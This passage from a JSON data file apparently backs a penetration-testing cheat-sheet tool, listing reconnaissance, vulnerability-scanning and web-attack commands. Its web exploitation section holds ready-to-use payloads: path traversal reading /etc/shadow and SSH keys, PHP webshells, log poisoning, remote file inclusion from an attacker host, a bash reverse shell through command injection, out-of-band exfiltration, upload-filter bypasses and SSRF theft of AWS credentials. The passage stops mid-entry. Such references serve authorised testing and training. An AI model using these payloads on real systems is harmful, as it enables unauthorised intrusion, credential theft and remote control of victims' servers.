            "cmd": "curl -L http://<TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Curl Custom Method",
            "desc": "Send request with specific HTTP method",
            "cmd": "curl -X OPTIONS http://<TARGET_IP> -v",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Nikto Web Scan",
            "desc": "Comprehensive web server vulnerability scanner",
            "cmd": "nikto -h http://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Nikto with Port",
            "desc": "Nikto scan on non-standard port",
            "cmd": "nikto -h http://<TARGET_IP>:<PORT>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nikto SSL Scan",
            "desc": "Nikto scan with SSL",
            "cmd": "nikto -h https://<TARGET_IP> -ssl",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "WAF Detection with wafw00f",
            "desc": "Detect Web Application Firewalls",
            "cmd": "wafw00f http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "wafw00f All WAFs",
            "desc": "Test against all known WAF signatures",
            "cmd": "wafw00f -a http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Curl HTTP Methods Check",
            "desc": "Test allowed HTTP methods with OPTIONS",
            "cmd": "curl -X OPTIONS http://<TARGET_IP>/ -I",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Curl Custom Host Header",
            "desc": "Send request with custom Host header for vhost testing",
            "cmd": "curl -H 'Host: <VHOST>' http://<TARGET_IP>/",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WhatWeb Verbose Output",
            "desc": "Detailed web tech fingerprinting with verbose",
            "cmd": "whatweb -v http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap HTTP Title",
            "desc": "Grab web page titles via nmap NSE",
            "cmd": "nmap --script http-title -p 80,443,8080,8443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap HTTP Headers",
            "desc": "Extract HTTP headers via nmap NSE",
            "cmd": "nmap --script http-headers -p 80,443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Curl CORS Test",
            "desc": "Test for CORS misconfiguration",
            "cmd": "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/ | grep -i 'Access-Control'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WAF Detection",
            "desc": "Detect web app firewalls",
            "cmd": "wafw00f http://<TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "WAF Fingerprint All",
            "desc": "Test all WAF signatures",
            "cmd": "wafw00f -a http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "cURL Security Headers",
            "desc": "Check security headers",
            "cmd": "curl -sI http://<TARGET_IP> | grep -iE 'server|x-powered|x-frame|content-security|strict-transport'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "cURL Check Methods",
            "desc": "Test allowed HTTP methods",
            "cmd": "curl -sI -X OPTIONS http://<TARGET_IP> | grep -i allow",
            "tags": [
              "essential"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "vuln-assessment",
    "name": "Weakness Identification & Scanning",
    "icon": "⚡",
    "description": "Identify known vulnerabilities and misconfigurations across network services and web applications using automated scanners and targeted scripts.",
    "subcategories": [
      {
        "name": "Network-Level Scanning",
        "commands": [
          {
            "title": "Nmap Vuln Scripts",
            "desc": "Run all vuln-category NSE scripts",
            "cmd": "nmap --script vuln -p <PORTS> -Pn <TARGET_IP> -oN nmap_vuln.txt",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap MS17-010 (EternalBlue)",
            "desc": "Check for EternalBlue SMB vulnerability",
            "cmd": "nmap --script smb-vuln-ms17-010 -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap MS08-067 (Conficker)",
            "desc": "Check for MS08-067 NetAPI vulnerability",
            "cmd": "nmap --script smb-vuln-ms08-067 -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Heartbleed Check",
            "desc": "Test for OpenSSL Heartbleed vulnerability",
            "cmd": "nmap --script ssl-heartbleed -p 443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap Shellshock Check",
            "desc": "Test for Bash Shellshock vulnerability",
            "cmd": "nmap --script http-shellshock --script-args uri=/cgi-bin/<SCRIPT> -p 80 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap SMB Vuln Scan All",
            "desc": "Check for all SMB vulnerabilities",
            "cmd": "nmap --script 'smb-vuln-*' -p 445 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap FTP Anonymous Check",
            "desc": "Check for anonymous FTP login",
            "cmd": "nmap --script ftp-anon -p 21 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap HTTP Methods Check",
            "desc": "Enumerate allowed HTTP methods (PUT, DELETE)",
            "cmd": "nmap --script http-methods -p 80,443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap HTTP Robots Check",
            "desc": "Retrieve and display robots.txt",
            "cmd": "nmap --script http-robots.txt -p 80,443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap HTTP Enum",
            "desc": "Enumerate common web directories and files",
            "cmd": "nmap --script http-enum -p 80,443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap RDP Bluekeep Check",
            "desc": "Check for CVE-2019-0708 BlueKeep",
            "cmd": "nmap --script rdp-vuln-ms12-020 -p 3389 -Pn <TARGET_IP>",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSLScan Full Analysis",
            "desc": "Analyze SSL/TLS ciphers and certificates",
            "cmd": "sslscan <TARGET_IP>:443",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "TestSSL Full Test",
            "desc": "Comprehensive SSL/TLS testing",
            "cmd": "testssl.sh https://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "TestSSL Vulnerabilities Only",
            "desc": "Test for known SSL vulnerabilities only",
            "cmd": "testssl.sh --vulnerable https://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap SSL Enum Ciphers",
            "desc": "Enumerate SSL/TLS ciphers and protocols",
            "cmd": "nmap --script ssl-enum-ciphers -p 443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap SSL Certificate Info",
            "desc": "Extract SSL certificate details",
            "cmd": "nmap --script ssl-cert -p 443 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap SSH Brute Force",
            "desc": "Brute force SSH via NSE",
            "cmd": "nmap --script ssh-brute -p 22 -Pn <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap FTP Bounce Check",
            "desc": "Check for FTP bounce attack",
            "cmd": "nmap --script ftp-bounce -p 21 -Pn <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap SMTP Open Relay",
            "desc": "Check for open SMTP relay",
            "cmd": "nmap --script smtp-open-relay -p 25 -Pn <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap NFS Enumeration",
            "desc": "Enumerate NFS exports and permissions",
            "cmd": "nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap MySQL Audit",
            "desc": "Run MySQL audit and empty password check",
            "cmd": "nmap --script mysql-empty-password,mysql-info,mysql-enum -p 3306 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap LDAP RootDSE",
            "desc": "Query LDAP root DSE for domain info",
            "cmd": "nmap --script ldap-rootdse -p 389 -Pn <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap DNS Brute Force",
            "desc": "Brute force DNS subdomains via NSE",
            "cmd": "nmap --script dns-brute --script-args dns-brute.domain=<DOMAIN> -Pn <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap vsftpd Backdoor",
            "desc": "Test vsftpd 2.3.4 backdoor",
            "cmd": "nmap --script ftp-vsftpd-backdoor -p 21 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap SambaCry",
            "desc": "Test CVE-2017-7494",
            "cmd": "nmap --script smb-vuln-cve-2017-7494 -p 445 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap BlueKeep",
            "desc": "Test CVE-2019-0708",
            "cmd": "nmap --script rdp-vuln-ms12-020 -p 3389 <TARGET_IP>",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Nmap IIS Short Names",
            "desc": "Brute force IIS short names",
            "cmd": "nmap --script http-iis-short-name-brute -p 80 <TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nmap HTTP Config Backup",
            "desc": "Find config backups",
            "cmd": "nmap --script http-config-backup -p 80 <TARGET_IP>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Web App Scanning",
        "commands": [
          {
            "title": "Nikto Full Web Scan",
            "desc": "Comprehensive web server vulnerability scan",
            "cmd": "nikto -h http://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Nikto with Tuning",
            "desc": "Nikto scan focused on specific test types",
            "cmd": "nikto -h http://<TARGET_IP> -Tuning 123bde",
            "tags": [
              "tool"
            ],
            "note": "Tuning: 1=files, 2=misconfig, 3=info disclosure, b=software id, d=debug, e=remote sources"
          },
          {
            "title": "Nuclei Default Templates",
            "desc": "Run Nuclei with all default templates",
            "cmd": "nuclei -u http://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Nuclei Severity Filter",
            "desc": "Run Nuclei for critical and high severity only",
            "cmd": "nuclei -u http://<TARGET_IP> -severity critical,high",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nuclei Specific Tags",
            "desc": "Run Nuclei templates matching specific tags",
            "cmd": "nuclei -u http://<TARGET_IP> -tags cve,sqli,xss,rce,lfi",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nuclei with Target List",
            "desc": "Run Nuclei against multiple targets from file",
            "cmd": "nuclei -l targets.txt -severity critical,high,medium -o nuclei_results.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Nuclei Technology-Specific",
            "desc": "Run Nuclei for a specific technology stack",
            "cmd": "nuclei -u http://<TARGET_IP> -tags apache,nginx,iis,tomcat",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "AutoRecon",
            "desc": "Full automated recon",
            "cmd": "autorecon <TARGET_IP> -o autorecon_output",
            "tags": [
              "essential"
            ],
            "note": "Runs nmap, nikto, gobuster etc. automatically"
          },
          {
            "title": "reconFTW",
            "desc": "Complete recon automation",
            "cmd": "./reconftw.sh -d <DOMAIN> -r -o reconftw_output",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "CMS-Specific Scanners",
        "commands": [
          {
            "title": "WPScan Full Enumeration",
            "desc": "Full WordPress scan with plugins, themes, users",
            "cmd": "wpscan --url http://<TARGET_IP> -e ap,at,u --plugins-detection aggressive",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "WPScan with API Token",
            "desc": "WordPress scan with vulnerability database lookup",
            "cmd": "wpscan --url http://<TARGET_IP> -e ap,at,u --api-token <WPSCAN_TOKEN>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "WPScan Password Brute Force",
            "desc": "Brute force WordPress login credentials",
            "cmd": "wpscan --url http://<TARGET_IP> -U <USER> -P /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "WPScan Enumerate Vulnerable Plugins",
            "desc": "Enumerate plugins with known vulnerabilities",
            "cmd": "wpscan --url http://<TARGET_IP> -e vp --plugins-detection aggressive",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "WPScan Enumerate Users",
            "desc": "Enumerate WordPress usernames",
            "cmd": "wpscan --url http://<TARGET_IP> -e u",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "WPScan with Custom WP Path",
            "desc": "Scan WordPress on non-standard path",
            "cmd": "wpscan --url http://<TARGET_IP>/<WP_PATH> --wp-content-dir wp-content",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "JoomScan Full Scan",
            "desc": "Joomla vulnerability scanner",
            "cmd": "joomscan -u http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "JoomScan Enum Components",
            "desc": "Enumerate Joomla components",
            "cmd": "joomscan -u http://<TARGET_IP> -ec",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "DroopeScan Drupal",
            "desc": "Scan Drupal installation for vulnerabilities",
            "cmd": "droopescan scan drupal -u http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "DroopeScan SilverStripe",
            "desc": "Scan SilverStripe CMS",
            "cmd": "droopescan scan silverstripe -u http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          }
        ]
      }
    ]
  },
  {
    "id": "web-exploitation",
    "name": "Web Attack Techniques",
    "icon": "🌐",
    "description": "Exploit web application vulnerabilities including directory traversal, injection, file upload, and server-side attacks to gain unauthorized access.",
    "subcategories": [
      {
        "name": "Path & Content Discovery",
        "commands": [
          {
            "title": "Gobuster Directory Brute Force",
            "desc": "Brute force directories and files",
            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Gobuster with Extensions",
            "desc": "Brute force with file extension filter",
            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,asp,aspx,jsp -o gobuster_ext.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Gobuster DNS Subdomain",
            "desc": "Brute force subdomains via DNS",
            "cmd": "gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Gobuster VHost Brute Force",
            "desc": "Brute force virtual hosts",
            "cmd": "gobuster vhost -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Gobuster with Cookies",
            "desc": "Directory brute force with session cookie",
            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c 'session=<COOKIE>'",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Feroxbuster Recursive",
            "desc": "Recursive directory brute force",
            "cmd": "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -o ferox.txt",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "Feroxbuster with Depth",
            "desc": "Control recursion depth",
            "cmd": "feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 3 -x php,html,txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "FFUF Directory Discovery",
            "desc": "Fast directory fuzzing with ffuf",
            "cmd": "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ffuf.json",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "FFUF VHost Discovery",
            "desc": "Virtual host discovery with ffuf",
            "cmd": "ffuf -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <FILTER_SIZE>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "FFUF Extension Fuzzing",
            "desc": "Fuzz for files with specific extensions",
            "cmd": "ffuf -u http://<TARGET_IP>/indexFUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Dirsearch Standard",
            "desc": "Web path scanner with smart wordlist",
            "cmd": "dirsearch -u http://<TARGET_IP> -e php,html,txt,asp,aspx,jsp",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Dirb Default Scan",
            "desc": "Web content brute force with dirb",
            "cmd": "dirb http://<TARGET_IP>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Wfuzz Directory Discovery",
            "desc": "Directory fuzzing with wfuzz",
            "cmd": "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://<TARGET_IP>/FUZZ",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Parameter Discovery & Fuzzing",
        "commands": [
          {
            "title": "FFUF GET Parameter Fuzzing",
            "desc": "Discover hidden GET parameters",
            "cmd": "ffuf -u 'http://<TARGET_IP>/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <FILTER_SIZE>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "FFUF POST Parameter Fuzzing",
            "desc": "Discover hidden POST parameters",
            "cmd": "ffuf -u http://<TARGET_IP>/page -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <FILTER_SIZE>",
            "tags": [
              "essential",
              "tool"
            ]
          },
          {
            "title": "FFUF Value Fuzzing",
            "desc": "Fuzz parameter values",
            "cmd": "ffuf -u 'http://<TARGET_IP>/page?id=FUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt -fs <FILTER_SIZE>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "Wfuzz POST Parameter Fuzz",
            "desc": "Fuzz POST data with wfuzz",
            "cmd": "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hc 404 http://<TARGET_IP>/page",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "FFUF Recursive Fuzzing",
            "desc": "Recursive directory fuzzing with filters",
            "cmd": "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 2 -e .php,.html,.txt -fs <FILTER_SIZE>",
            "tags": [
              "tool"
            ]
          },
          {
            "title": "FFUF with Cookie Auth",
            "desc": "Fuzz with authenticated session",
            "cmd": "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 'session=<COOKIE>' -fs <FILTER_SIZE>",
            "tags": [
              "tool"
            ]
          }
        ]
      },
      {
        "name": "Local File Inclusion",
        "commands": [
          {
            "title": "LFI Basic Traversal",
            "desc": "Basic directory traversal to read /etc/passwd",
            "cmd": "curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LFI Null Byte Bypass",
            "desc": "Null byte to bypass extension appending (PHP <5.3)",
            "cmd": "curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd%00'",
            "tags": [
              "essential"
            ],
            "note": "Works on PHP < 5.3.4"
          },
          {
            "title": "LFI Double Encoding",
            "desc": "Double URL-encode traversal characters",
            "cmd": "curl 'http://<TARGET_IP>/page?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "LFI PHP Base64 Wrapper",
            "desc": "Read PHP source code via base64 wrapper",
            "cmd": "curl 'http://<TARGET_IP>/page?file=php://filter/convert.base64-encode/resource=index.php'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LFI PHP Input Wrapper",
            "desc": "Execute PHP code via input wrapper",
            "cmd": "curl -X POST 'http://<TARGET_IP>/page?file=php://input' -d '<?php system(\"id\"); ?>'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LFI Data Wrapper",
            "desc": "Execute PHP via data:// wrapper",
            "cmd": "curl 'http://<TARGET_IP>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "LFI Expect Wrapper",
            "desc": "Execute commands via expect wrapper",
            "cmd": "curl 'http://<TARGET_IP>/page?file=expect://id'",
            "tags": [
              "advanced"
            ],
            "note": "Requires expect module enabled"
          },
          {
            "title": "LFI Log Poisoning (Apache)",
            "desc": "Poison Apache access log then include it",
            "cmds": [
              "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET_IP>/",
              "curl 'http://<TARGET_IP>/page?file=../../../../var/log/apache2/access.log&cmd=id'"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Log path varies: /var/log/apache2/access.log, /var/log/httpd/access_log"
          },
          {
            "title": "LFI Log Poisoning (SSH)",
            "desc": "Poison auth.log via SSH then include it",
            "cmds": [
              "ssh '<?php system($_GET[\"cmd\"]); ?>'@<TARGET_IP>",
              "curl 'http://<TARGET_IP>/page?file=../../../../var/log/auth.log&cmd=id'"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "LFI /proc/self/environ",
            "desc": "Include process environment variables",
            "cmd": "curl 'http://<TARGET_IP>/page?file=../../../../proc/self/environ'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "LFI Common Linux Files",
            "desc": "Important files to check via LFI on Linux",
            "cmds": [
              "curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd'",
              "curl 'http://<TARGET_IP>/page?file=../../../../etc/shadow'",
              "curl 'http://<TARGET_IP>/page?file=../../../../etc/hosts'",
              "curl 'http://<TARGET_IP>/page?file=../../../../home/<USER>/.ssh/id_rsa'",
              "curl 'http://<TARGET_IP>/page?file=../../../../etc/crontab'"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "LFI Common Windows Files",
            "desc": "Important files to check via LFI on Windows",
            "cmds": [
              "curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'",
              "curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\win.ini'",
              "curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\system.ini'"
            ],
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "Remote File Inclusion",
        "commands": [
          {
            "title": "RFI Basic Inclusion",
            "desc": "Include a remote PHP shell",
            "cmd": "curl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.php'",
            "tags": [
              "essential"
            ],
            "note": "Requires allow_url_include=On in PHP"
          },
          {
            "title": "RFI with Null Byte",
            "desc": "RFI with null byte to bypass extension appending",
            "cmd": "curl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.txt%00'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "RFI SMB Share (Windows)",
            "desc": "Include file from attacker SMB share on Windows target",
            "cmd": "curl 'http://<TARGET_IP>/page?file=\\\\<ATTACKER_IP>\\share\\shell.php'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Host RFI Payload",
            "desc": "Start a web server to host RFI payloads",
            "cmd": "python3 -m http.server 80",
            "tags": [
              "essential"
            ]
          }
        ]
      },
      {
        "name": "OS Command Injection",
        "commands": [
          {
            "title": "Command Injection Semicolon",
            "desc": "Inject command using semicolon separator",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;id'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Command Injection Pipe",
            "desc": "Inject command using pipe operator",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1|id'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Command Injection OR",
            "desc": "Inject using logical OR",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=||id'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Command Injection AND",
            "desc": "Inject using logical AND",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1&&id'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Command Injection Substitution",
            "desc": "Inject via command substitution",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=$(id)'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Command Injection Backticks",
            "desc": "Inject via backtick substitution",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=`id`'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Command Injection Newline",
            "desc": "Inject command with URL-encoded newline",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1%0aid'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Blind Command Injection (Time)",
            "desc": "Detect blind injection with sleep delay",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;sleep+5'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Blind Command Injection (OOB)",
            "desc": "Detect blind injection via out-of-band DNS/HTTP",
            "cmds": [
              "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;curl+http://<ATTACKER_IP>/$(whoami)'",
              "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;nslookup+$(whoami).<ATTACKER_DOMAIN>'"
            ],
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Command Injection Rev Shell",
            "desc": "Inject a reverse shell command",
            "cmd": "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;bash+-c+\"bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<PORT>+0>%261\"'",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "Unrestricted File Upload",
        "commands": [
          {
            "title": "Upload PHP Shell (Direct)",
            "desc": "Upload a basic PHP web shell",
            "cmd": "curl -F 'file=@shell.php' http://<TARGET_IP>/upload",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Upload Double Extension Bypass",
            "desc": "Bypass extension filter with double extension",
            "cmd": "curl -F 'file=@shell.php.jpg' http://<TARGET_IP>/upload",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Upload Content-Type Bypass",
            "desc": "Bypass content-type validation",
            "cmd": "curl -F 'file=@shell.php;type=image/jpeg' http://<TARGET_IP>/upload",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Upload .htaccess Override",
            "desc": "Upload .htaccess to make .jpg execute as PHP",
            "cmds": [
              "echo 'AddType application/x-httpd-php .jpg' > .htaccess",
              "curl -F 'file=@.htaccess' http://<TARGET_IP>/upload",
              "curl -F 'file=@shell.jpg' http://<TARGET_IP>/upload"
            ],
            "tags": [
              "advanced"
            ],
            "note": "shell.jpg contains PHP code"
          },
          {
            "title": "Upload Case Variation",
            "desc": "Bypass with case-altered extension",
            "cmd": "curl -F 'file=@shell.pHp' http://<TARGET_IP>/upload",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Upload Alternate PHP Extensions",
            "desc": "Try alternative PHP extensions",
            "cmds": [
              "curl -F 'file=@shell.php5' http://<TARGET_IP>/upload",
              "curl -F 'file=@shell.phtml' http://<TARGET_IP>/upload",
              "curl -F 'file=@shell.phar' http://<TARGET_IP>/upload",
              "curl -F 'file=@shell.phps' http://<TARGET_IP>/upload"
            ],
            "tags": [
              "essential"
            ]
          },
          {
            "title": "Upload Magic Bytes Bypass",
            "desc": "Prepend magic bytes to bypass file type check",
            "cmd": "printf '\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a<?php system($_GET[\"cmd\"]); ?>' > shell.php.png",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "Upload Null Byte (Legacy)",
            "desc": "Null byte in filename to bypass filters",
            "cmd": "curl -F 'file=@shell.php%00.jpg' http://<TARGET_IP>/upload",
            "tags": [
              "advanced"
            ]
          }
        ]
      },
      {
        "name": "Server-Side Request Forgery",
        "commands": [
          {
            "title": "SSRF Localhost",
            "desc": "Access internal services via localhost",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://127.0.0.1/'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSRF Localhost Bypass (Decimal)",
            "desc": "Bypass filters using decimal IP",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://2130706433/'",
            "tags": [
              "advanced"
            ],
            "note": "2130706433 = 127.0.0.1 in decimal"
          },
          {
            "title": "SSRF Localhost Bypass (Hex)",
            "desc": "Bypass filters using hex IP",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://0x7f000001/'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSRF Localhost Bypass (Short)",
            "desc": "Bypass using shortened localhost",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://0/'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSRF IPv6 Localhost",
            "desc": "Bypass using IPv6 localhost",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://[::1]/'",
            "tags": [
              "advanced"
            ]
          },
          {
            "title": "SSRF AWS Metadata",
            "desc": "Access AWS EC2 metadata endpoint",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://169.254.169.254/latest/meta-data/'",
            "tags": [
              "essential"
            ]
          },
          {
            "title": "SSRF AWS Credentials",
            "desc": "Steal AWS IAM role credentials",
            "cmd": "curl 'http://<TARGET_IP>/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>'",
            "tags": [
              "essential"
            ]
          },
          {
